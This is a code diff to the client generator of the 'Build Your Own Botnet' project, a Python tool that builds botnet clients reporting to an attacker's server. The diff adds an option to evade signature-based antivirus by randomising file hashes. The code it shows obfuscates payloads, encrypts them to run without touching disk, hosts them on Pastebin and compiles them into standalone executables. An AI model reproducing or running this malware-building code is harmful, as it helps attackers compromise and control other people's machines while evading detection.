@@ -62,6 +62,104 @@ _debug  = True
 _logger = logging.getLogger(__name__)
 _logger.addHandler(logging.StreamHandler())
 
+def main():
+    # command line argument parser
+    parser = argparse.ArgumentParser(prog='client.py', description="Client Generator (Build Your Own Botnet)", version='0.1.3')
+
+    # optional arguments
+    parser.add_argument('host', 
+                        action='store', 
+                        type=str, 
+                        help='server IP to connect to', 
+                        default='localhost')
+
+    parser.add_argument('port', 
+                        action='store', 
+                        type=int, 
+                        help='server port number', 
+                        default=1337)
+
+    parser.add_argument('--upload', 
+                        action='store_true', 
+                        help='upload & host payload on pastebin (requires --pastebin)', 
+                        default=False)
+
+    parser.add_argument('--antivirus',
+                        action='store_true',
+                        default=False,
+                        help='evade signature-based antivirus by randomizing file hash')
+
+    parser.add_argument('--encrypt', 
+                        action='store_true', 
+                        help='encrypt payload (decrypts & runs without touching disk)', 
+                        default=False)
+
+    parser.add_argument('--obfuscate', 
+                        action='store_true', 
+                        help='obfuscate names of classes, functions, variables, etc.', 
+                        default=False)
+
+    parser.add_argument('--compress', 
+                        action='store_true', 
+                        help='zip-compress into a self-executing python script', 
+                        default=False)
+
+    parser.add_argument('--compile', 
+                        action='store_true', 
+                        help='compile into a standalone bundled executable', 
+                        default=False)
+
+    parser.add_argument('--debug', 
+                        action='store_true',
+                        help='print debugging output to the console',
+                        default=False)
+
+    # credentials
+    creds = parser.add_argument_group('credentials')
+    creds.title = 'optional credentials'
+
+    creds.add_argument('--ftp-host', 
+                        action='store', 
+                        metavar='HOST', 
+                        help='FTP server host')
+
+    creds.add_argument('--ftp-user', 
+                        action='store', 
+                        metavar='USER', 
+                        help='FTP login username')
+
+    creds.add_argument('--ftp-pass', 
+                        action='store', 
+                        metavar='PASS', 
+                        help='FTP login password')
+
+    # api keys
+    api  = parser.add_argument_group('api')
+    api.title = 'optional api keys'
+
+    api.add_argument('--imgur', 
+                        action='store', 
+                        type=str, 
+                        metavar='API', 
+                        help='imgur api key')
+
+    api.add_argument('--pastebin', 
+                        action='store', 
+                        type=str, 
+                        metavar='API', 
+                        help='pastebin api key')
+
+    api.add_argument('--vultr', 
+                        action='store', 
+                        type=str, 
+                        metavar='API', 
+                        help='vultr api key')
+
+    options = parser.parse_args()
+    globals()['_debug'] = options.debug
+    globals()['_logger'].setLevel(logging.DEBUG if options.debug else logging.ERROR)
+    return run(options)
+
 def upload(source, api_dev_key=None, api_user_key=None):
     """ 
     Upload file/data to Pastebin
@@ -131,23 +229,22 @@ def exe(options, filename):
     :param str filename:    target filename
     """
     try:
-        filename= os.path.join(os.path.expandvars('%TEMP%') if os.name is 'nt' else '/tmp', filename)
-        pyname  = os.path.basename(filename)
-        name    = os.path.splitext(pyname)[0]
-        dist    = os.path.abspath('clients')
-        key     = util.variable(16)
-        icon    = options.icon if os.path.isfile('resources/icon/%s.ico' % options.icon) else None
-        pkgs    = list(set([i.strip().split()[1] for i in open(filename).read().splitlines() if len(i.strip().split()) if i.strip().split()[0] == 'import'] + [i.strip().split()[1] for i in open(filename,'r').read().splitlines() if len(i.strip().split()) if i.strip().split()[0] == 'import' if len(str(i.strip().split()[1])) < 35]))
-        spec    = open('resources/pyinstaller.spec','r').read().replace('[HIDDEN_IMPORTS]', str(pkgs)).replace('[ICON_PATH]', icon).replace('[PY_FILE]', pyname).replace('[DIST_PATH]', dist).replace('[NAME]', name).replace('[128_BIT_KEY]', key)
-        fspec   = os.path.join(dist, name + '.spec')
-        fp      = file(fspec, 'w')
-        fp.write(fspec)
-        fp.close()
+        filename = os.path.join(tempfile.gettempdir(), os.path.basename(filename))
+        pyname   = os.path.basename(filename)
+        name     = os.path.splitext(pyname)[0]
+        dist     = os.path.abspath('.')
+        key      = util.variable(16)
+        icon     = options.icon if os.path.isfile(options.icon) else None
+        pkgs     = list(set([i.strip().split()[1] for i in open(filename).read().splitlines() if len(i.strip().split()) if i.strip().split()[0] == 'import'] + [i.strip().split()[1] for i in open(filename,'r').read().splitlines() if len(i.strip().split()) if i.strip().split()[0] == 'import' if len(str(i.strip().split()[1])) < 35]))
+        spec     = open('resources/pyinstaller.spec','r').read().replace('[HIDDEN_IMPORTS]', str(pkgs)).replace('[ICON_PATH]', icon).replace('[PY_FILE]', pyname).replace('[DIST_PATH]', dist).replace('[NAME]', name).replace('[128_BIT_KEY]', key)
+        fspec    = os.path.join(dist, name + '.spec')
+        with file(fspec, 'w') as fp:
+            fp.write(fspec)
         try:
-            pyinst  = subprocess.check_output('where PyInstaller' if os.name == 'nt' else 'which PyInstaller', shell=True).strip().rstrip()
+            pyinst = subprocess.check_output('where PyInstaller' if os.name == 'nt' else 'which PyInstaller', shell=True).strip().rstrip()
         except:
-            raise Exception("missing package 'PyInstaller' is required to compile .py/.pyz into .exe")
-        make    = subprocess.Popen('{} -m {} {}'.format(sys.executable, pyinst, fspec), 0, None, subprocess.PIPE, subprocess.PIPE, subprocess.PIPE, shell=True)
+            raise Exception("missing package 'PyInstaller' is required to compile .py into .exe")
+        make = subprocess.Popen('{} -m {} {}'.format(sys.executable, pyinst, fspec), 0, None, subprocess.PIPE, subprocess.PIPE, subprocess.PIPE, shell=True)
         if globals()['_debug']:
             while True:
                 if make.poll():
@@ -161,8 +258,8 @@ def exe(options, filename):
             make.wait()
         if not make.returncode == 0:
             raise Exception("failed to compile executable: {}".format(str().join((make.communicate()))))
-        exe     = os.path.join((dist, 'dist', name, '.exe' if os.name == 'nt' else ''))
-        build   = map(util.delete, (filename, fspec, os.path.join(dist, 'build')))
+        exe   = os.path.join((dist, 'dist', name, '.exe' if os.name == 'nt' else ''))
+        build = map(util.delete, (filename, fspec, os.path.join(dist, 'build')))
         return exe
     except Exception as e:
         globals()['_logger'].error('Method {} returned error: {}'.format(exe.func_name, str(e)))
@@ -176,7 +273,7 @@ def app(options, filename):
     :param str filename:    target filename
     """
     try:
-        iconFile        = options.icon if os.path.isfile('resources/icon/%s.ico' % options.icon) else None
+        iconFile        = options.icon if os.path.isfile(options.icon) else None
         version         = '%d.%d.%d' % (random.randint(0,3), random.randint(0,6), random.randint(1, 9))
         baseName        = os.path.basename(filename)
         bundleName      = os.path.splitext(baseName)[0]
@@ -202,28 +299,27 @@ def app(options, filename):
     except Exception as e:
         globals()['_logger'].error('Method {} returned error: {}'.format(app.func_name, str(e)))
 
-def run(options, payload='clients/templates/payload.py', stager='clients/templates/stager.py'):
+def run(options, payload='modules/payload.py', stager='modules/stager.py'):
     """
-    Generate the main Python stager
+    Generate a client
 
     `Required`
-    :param options:         command line arguments (argparse.Namespace object)
-    :param str payload:     payload filename (default: clients/payload.py)
-    :param str stager:      payload stager file template (default: clients/stager.py)
+    :param options:         parsed arguments
+    :param str payload:     payload filename 
+    :param str stager:      stager filename
     """
-    client = tempfile.NamedTemporaryFile(prefix='byob_', suffix='.py', dir=os.path.abspath('clients'), delete=False)
     if not os.path.isdir('clients'):
         os.mkdir('clients')
+    client = tempfile.NamedTemporaryFile(prefix='client_', suffix='.py', dir=os.path.abspath('clients'), delete=False)
 
     # Payload
-
-    payload = open(payload, 'r').read().replace('__KWARGS__', ', '.join(["host='{}', port={}".format(options.host, options.port), "ftp={}".format(json.dumps({'host': options.ftp_host, 'user': options.ftp_user, 'password': options.ftp_passwd}) if bool(options.ftp_host and options.ftp_user and options.ftp_passwd) else '', "pastebin='{}'".format(options.pastebin) if options.pastebin else '', "imgur='{}'".format(options.imgur) if options.imgur else '')]))
+    payload = open(payload, 'r').read().replace('__KWARGS__', ', '.join(["host='{}', port={}".format(options.host, options.port), "ftp={}".format(json.dumps({'host': options.ftp_host, 'user': options.ftp_user, 'pass': options.ftp_pass}) if bool(options.ftp_host and options.ftp_user and options.ftp_pass) else '', "pastebin='{}'".format(options.pastebin) if options.pastebin else '', "imgur='{}'".format(options.imgur) if options.imgur else '')]))
 
     if options.obfuscate:
         temp = tempfile.NamedTemporaryFile(prefix='byob_', suffix='.py', delete=False)
         temp.file.write(payload)
         temp.file.close()
-        obfs = subprocess.Popen('pyminifier -o {} --obfuscate-classes --obfuscate-functions --obfuscate-variables --obfuscate-builtins --replacement-length=1 {}'.format(temp.name, temp.name), 0, None, subprocess.PIPE, subprocess.PIPE, subprocess.PIPE, shell=True)
+        obfs = subprocess.Popen('pyminifier -o {} --obfuscate-classes --obfuscate-functions --obfuscate-variables --obfuscate-builtins --replacement-length=1 --pyz={}.pyz {}'.format(temp.name, os.path.splitext(os.path.basename(temp.name))[0], temp.name), 0, None, subprocess.PIPE, subprocess.PIPE, subprocess.PIPE, shell=True)
         obfs.wait()
         assert obfs.returncode == 0, "payload obfuscation failed - {}".format(str().join((obfs.communicate())))
         code = open(temp.name, 'r').read()
@@ -273,14 +369,13 @@ def run(options, payload='clients/templates/payload.py', stager='clients/templat
         util.display("    (hosting payload locally at {})".format(os.path.abspath(temp.name)))
 
     # Stager
-
-    stager   = open(stager, 'r').read().replace('__KWARGS__', ', '.join(["url='{}'".format(url) if 'url' in locals() else '', "key='{}'".format(key) if 'key' in locals() else '']))
+    stager   = '\n'.join([open(stager, 'r').read(), "if __name__=='__main__':", "    run({})".format(', '.join(["url='{}'".format(url) if 'url' in locals() else '', "key='{}'".format(key) if 'key' in locals() else '']))])
 
     if options.obfuscate:
         temp = tempfile.NamedTemporaryFile(prefix='byob_', suffix='.py', delete=False)
         temp.file.write(stager)
         temp.file.close()
-        obfs = subprocess.Popen('pyminifier -o {} --obfuscate-classes --obfuscate-functions --obfuscate-variables --obfuscate-builtins --replacement-length=1 {}'.format(temp.name, temp.name), 0, None, subprocess.PIPE, subprocess.PIPE, subprocess.PIPE, shell=True)
+        obfs = subprocess.Popen('pyminifier -o {} --obfuscate-classes --obfuscate-functions --obfuscate-variables --obfuscate-builtins --replacement-length=1 --pyz={}.pyz {}'.format(temp.name, os.path.splitext(os.path.basename(temp.name))[0], temp.name), 0, None, subprocess.PIPE, subprocess.PIPE, subprocess.PIPE, shell=True)
         obfs.wait()
         assert obfs.returncode == 0, "stager obfuscation failed - {}".format(str().join((obfs.communicate())))
         code = open(temp.name, 'r').read()
@@ -310,89 +405,6 @@ def run(options, payload='clients/templates/payload.py', stager='clients/templat
             return app(options, client.name)
         return exe(options, client.name)
     return client.name
-
-def main():
-    # command line argument parser
-    parser = argparse.ArgumentParser(prog='client.py', description="Client Generator (Build Your Own Botnet)", version='0.1.3')
-
-    # optional arguments
-    parser.add_argument('host', 
-                        action='store', 
-                        type=str, 
-                        help='server IP to connect to', 
-                        default='localhost')
-    parser.add_argument('port', 
-                        action='store', 
-                        type=int, 
-                        help='server port number', 
-                        default=1337)
-    parser.add_argument('--upload', 
-                        action='store_true', 
-                        help='upload & host payload on pastebin (requires --pastebin)', 
-                        default=False)
-    parser.add_argument('--encrypt', 
-                        action='store_true', 
-                        help='encrypt payload (decrypts & runs without touching disk)', 
-                        default=False)
-    parser.add_argument('--obfuscate', 
-                        action='store_true', 
-                        help='obfuscate names of classes, functions, variables, etc.', 
-                        default=False)
-    parser.add_argument('--compress', 
-                        action='store_true', 
-                        help='zip-compress into a self-executing python script', 
-                        default=False)
-    parser.add_argument('--compile', 
-                        action='store_true', 
-                        help='compile into a standalone bundled executable', 
-                        default=False)
-    parser.add_argument('--debug', 
-                        action='store_true',
-                        help='print debugging output to the console',
-                        default=False)
-
-    # credentials
-    creds = parser.add_argument_group('credentials')
-    creds.title = 'optional credentials'
-
-    creds.add_argument('--ftp-host', 
-                        action='store', 
-                        metavar='HOST', 
-                        help='FTP server host')
-    creds.add_argument('--ftp-user', 
-                        action='store', 
-                        metavar='USER', 
-                        help='FTP login username')
-    creds.add_argument('--ftp-passwd', 
-                        action='store', 
-                        metavar='PASSWD', 
-                        help='FTP login password')
-
-    # api keys
-    api  = parser.add_argument_group('api')
-    api.title = 'optional api keys'
-
-    api.add_argument('--imgur', 
-                        action='store', 
-                        type=str, 
-                        metavar='API', 
-                        help='imgur api key')
-    api.add_argument('--pastebin', 
-                        action='store', 
-                        type=str, 
-                        metavar='API', 
-                        help='pastebin api key')
-    api.add_argument('--vultr', 
-                        action='store', 
-                        type=str, 
-                        metavar='API', 
-                        help='vultr api key')
-
-    options = parser.parse_args()
-    globals()['_debug'] = options.debug
-    globals()['_logger'].setLevel(logging.DEBUG if options.debug else logging.ERROR)
-    return run(options)
-
 
 if __name__ == '__main__':
     main()
